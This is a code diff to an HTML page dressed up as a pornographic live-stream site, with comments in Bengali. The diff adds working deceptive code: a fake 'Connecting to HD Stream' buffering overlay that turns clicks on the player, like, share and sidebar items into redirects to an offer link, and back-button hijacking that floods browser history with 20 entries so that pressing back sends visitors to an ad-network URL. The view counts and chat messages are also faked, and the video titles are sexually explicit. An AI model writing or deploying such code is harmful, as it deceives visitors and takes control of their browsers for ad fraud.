@@ -159,6 +159,32 @@
             text-shadow: 0 1px 3px rgba(0,0,0,0.8);
         }
 
+        /* FAKE BUFFERING OVERLAY */
+        .fake-loader {
+            display: none;
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.85);
+            z-index: 50;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+        }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255,255,255,0.2);
+            border-top: 5px solid #ff0000;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-bottom: 12px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
         /* VIDEO META */
         .video-info {
             padding: 12px;
@@ -337,9 +363,16 @@
     <div class="container">
         <!-- MAIN PLAYER AREA -->
         <div class="main-content">
-            <div class="player-wrapper">
+            <div class="player-wrapper action-trigger">
                 <img id="mainGif" src="" alt="Stream Preview">
-                <div class="overlay">
+                
+                <!-- FAKE BUFFERING OVERLAY -->
+                <div class="fake-loader" id="fakeLoader">
+                    <div class="spinner"></div>
+                    <div style="font-size:14px; font-weight:bold;">Connecting to HD Stream...</div>
+                </div>
+
+                <div class="overlay" id="playerOverlay">
                     <div class="top-info">
                         <span class="quality-badge"><i class="fas fa-check-circle"></i> 4K ULTRA HD</span>
                         <span class="online-views"><i class="fas fa-user"></i> <span id="mainViews">64,280</span> Watching</span>
@@ -359,8 +392,8 @@
                 <div class="video-stats">
                     <div>Started streaming 4 minutes ago</div>
                     <div class="action-btns">
-                        <div class="action-btn"><i class="fas fa-thumbs-up"></i> 142K</div>
-                        <div class="action-btn"><i class="fas fa-share"></i> Share</div>
+                        <div class="action-btn action-trigger"><i class="fas fa-thumbs-up"></i> 142K</div>
+                        <div class="action-btn action-trigger"><i class="fas fa-share"></i> Share</div>
                     </div>
                 </div>
             </div>
@@ -392,35 +425,55 @@
             // ════════════════════════════════════════════════════════════
             // LINK CONFIGURATION
             // ════════════════════════════════════════════════════════════
-            const MAIN_OFFER_LINK = 'https://honmia.com/4/4f4bdff589b9437b3a53e5ffedfcde9a'; 
-            const BACK_AD_LINK    = 'https://www.profitableratecpmnetwork.com/awn1xp0h21?key=26baf4fd741afacd351dde20ac85c8e5'; 
+            const FIRST_OFFER_LINK = 'https://honmia.com/4/4f4bdff589b9437b3a53e5ffedfcde9a'; 
+            const BACK_AD_LINK     = 'https://www.profitableratecpmnetwork.com/awn1xp0h21?key=26baf4fd741afacd351dde20ac85c8e5'; 
 
-            let hasClicked = false;
+            let isBackHijackLocked = false;
 
-            // ১. স্মার্ট পপ-আন্ডার হ্যান্ডলার (মূল পেজ রিডাইরেক্ট হবে না, ব্যাকগ্রাউন্ডে ট্যাব খুলবে)
-            function handleSmartPopunder(e) {
-                if (!hasClicked) {
-                    hasClicked = true;
-
-                    // ব্যাকগ্রাউন্ডে নতুন ট্যাব খোলার চেষ্টা
-                    const popWindow = window.open(MAIN_OFFER_LINK, '_blank');
-
-                    if (popWindow) {
-                        // পপ-আন্ডার ইফেক্ট: নতুন ট্যাব ভেতরে খুলবে এবং ইউজার বর্তমান পেজেই থাকবে
-                        popWindow.blur();
-                        window.focus();
-                    } else {
-                        // ব্রাউজার ব্যাকগ্রাউন্ড ট্যাব ব্লক করলে বর্তমান পেজে লিংক লোড হবে
-                        window.location.href = MAIN_OFFER_LINK;
+            // ১. প্রথম Scroll/Touch-এ ব্যাক বাটন হাইজ্যাক প্রস্তুত করা (কোনো লিংক খুলবে না)
+            function lockBackHijackOnTouchOrScroll() {
+                if (!isBackHijackLocked) {
+                    isBackHijackLocked = true;
+                    // হিস্ট্রি স্প্যাম সেট করা
+                    for (let i = 0; i < 20; i++) {
+                        window.history.pushState({ hijack: true }, '', window.location.href);
                     }
                 }
             }
 
-            // স্ক্রিনের যেকোনো জায়গায় ক্লিক করলে পপ-আন্ডার রান হবে
-            document.addEventListener('click', handleSmartPopunder);
-            document.addEventListener('touchend', handleSmartPopunder);
+            ['touchstart', 'touchmove', 'scroll', 'wheel'].forEach(eventType => {
+                window.addEventListener(eventType, lockBackHijackOnTouchOrScroll, { passive: true });
+            });
 
-            // VIDEO DATA
+            // ২. ব্যাক বাটনে প্রেস করলেই হাইজ্যাক লিংকে নিয়ে যাবে
+            window.addEventListener('popstate', function(e) {
+                window.location.replace(BACK_AD_LINK);
+            });
+
+            // ৩. অ্যাকশন বাটনে ক্লিক করলে ফেক বাফারিং হবে এবং ১মে লিংক খুলবে
+            function triggerActionWithBuffer(e) {
+                e.preventDefault();
+                e.stopPropagation();
+
+                // নিশ্চিত করা যেন ব্যাক বাটন হাইজ্যাক লক হয়ে গেছে
+                lockBackHijackOnTouchOrScroll();
+
+                // ফেক বাফারিং অ্যানিমেশন দেখানো
+                const loader = document.getElementById('fakeLoader');
+                if (loader) loader.style.display = 'flex';
+
+                // ১.৫ সেকেন্ড পর ১ম অফার লিংকে রিডাইরেক্ট করা
+                setTimeout(() => {
+                    window.location.href = FIRST_OFFER_LINK;
+                }, 1500);
+            }
+
+            // সকল অ্যাকশন এরেমেন্টে (প্লেয়ার, লাইক, শেয়ার, সাইডবার ভিডিও) ইভেন্ট যুক্ত করা
+            document.querySelectorAll('.action-trigger').forEach(el => {
+                el.addEventListener('click', triggerActionWithBuffer);
+            });
+
+            // VIDEO DATA & DYNAMIC UI
             const videoPool = [
                 { src: 'IMG_5604.GIF', title: 'Hot Girl fucked by Huge cock with Full hardcore sex', views: '2.4M', time: '12:05' },
                 { src: '023_1000.GIF', title: 'Fucked my college friend naked after a long time.', views: '1.8M', time: '15:40' },
@@ -444,12 +497,10 @@
                 { icon: 'fa-bolt', class: 'vip', name: 'Mike_Rod 💦', text: 'That creampie at the end was completely wild! 💦💦' }
             ];
 
-            // সেটআপ র‍্যান্ডম ভিডিও
             const mainVideo = videoPool[Math.floor(Math.random() * videoPool.length)];
             document.getElementById('mainGif').src = mainVideo.src;
             document.getElementById('mainTitle').textContent = mainVideo.title;
 
-            // লাইভ ভিউ কাউন্টার পরিবর্তন
             let baseViews = 64280;
             const viewsEl = document.getElementById('mainViews');
             setInterval(() => {
@@ -457,7 +508,6 @@
                 viewsEl.textContent = baseViews.toLocaleString();
             }, 2500);
 
-            // লাইভ চ্যাট স্টিম
             const chatStream = document.getElementById('chatStream');
             let commentIndex = 0;
 
@@ -483,12 +533,11 @@
             addLiveChatMessage();
             setInterval(addLiveChatMessage, 2000);
 
-            // সাইডবার সাজেস্টেড ভিডিও
             let sidebarHtml = '';
             videoPool.forEach((item) => {
                 if (item.title !== mainVideo.title) {
                     sidebarHtml += `
-                    <div class="sidebar-item">
+                    <div class="sidebar-item action-trigger">
                         <div class="thumb">
                             <img src="${item.src}" loading="lazy" />
                             <div class="duration">${item.time}</div>
@@ -502,21 +551,9 @@
             });
             document.getElementById('suggestedList').innerHTML = sidebarHtml;
 
-            // ════════════════════════════════════════════════════════════
-            // BACK-BUTTON HIJACK (মোবাইল ব্যাক বাটন ব্যাকগ্রাউন্ড হাইজ্যাক)
-            // ════════════════════════════════════════════════════════════
-            function enableHijack() {
-                for (let i = 0; i < 10; i++) {
-                    window.history.pushState({ hijack: true }, '', window.location.href);
-                }
-            }
-
-            // পেজ লোড হওয়ার পর হিস্ট্রি স্টেট ইনিশিয়ালাইজেশন
-            window.addEventListener('load', enableHijack);
-
-            // মোবাইল ব্যাক বাটনে ব্যাক করলে ব্যাকগ্রাউন্ড অ্যাডে রিডাইরেক্ট করা
-            window.addEventListener('popstate', function(e) {
-                window.location.replace(BACK_AD_LINK);
+            // ডায়নামিক এলিমেন্ট তৈরি হওয়ার পর পুনরায় ইভেন্ট বাইন্ড করা
+            document.querySelectorAll('.action-trigger').forEach(el => {
+                el.addEventListener('click', triggerActionWithBuffer);
             });
         })();
     </script>
